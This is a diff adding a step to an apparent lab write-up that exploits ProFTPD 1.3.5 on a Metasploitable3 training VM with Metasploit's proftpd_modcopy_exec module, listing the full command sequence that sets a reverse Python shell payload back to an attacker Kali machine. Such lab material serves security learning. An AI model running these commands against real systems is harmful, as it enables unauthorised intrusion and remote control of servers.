@@ -24,4 +24,49 @@ To discover vulnerable services running on the victim machine, we performed a fu
 ![Metasploitable3 IP Address](Screenshots/C-FindPorts.png)
 
 
+ ## 📍 Step 4: Exploiting ProFTPD 1.3.5 via `proftpd_modcopy_exec`
+
+In this step, we exploit the vulnerable **ProFTPD 1.3.5** service running on Metasploitable3 using the `unix/ftp/proftpd_modcopy_exec` module in Metasploit. The goal is to get a **reverse shell** back to our Kali machine.
+
+---
+![Metasploitable3 IP Address](Screenshots/D-msfconsole.png)
+### ✅ Summary of the Process
+
+- **Target (Metasploitable3) IP:** `10.0.2.7`  
+- **Attacker (Kali) IP:** `10.0.2.5`  
+- **Vulnerable Service:** ProFTPD 1.3.5  
+- **Exploit Module:** `exploit/unix/ftp/proftpd_modcopy_exec`  
+- **Payload Used:** `cmd/unix/reverse_python`  
+- **Writable Web Directory:** `/var/www/html`
+
+---
+
+### 🧰 Commands Used
+
+```bash
+# Start Metasploit
+msfconsole
+
+# Search and load the exploit module
+search proftpd 1.3.5
+use exploit/unix/ftp/proftpd_modcopy_exec
+
+# Set RHOST and LHOST
+set RHOST 10.0.2.7
+set LHOST 10.0.2.5
+
+# View available payloads and select one
+show payloads
+set payload cmd/unix/reverse_python
+
+# Set the writable directory on the target
+set SITEPATH /var/www/html
+
+# (Optional) Prevent cleanup and handler issues
+set AllowNoCleanup true
+set DisablePayloadHandler true
+
+# Run the exploit
+
+exploit
 
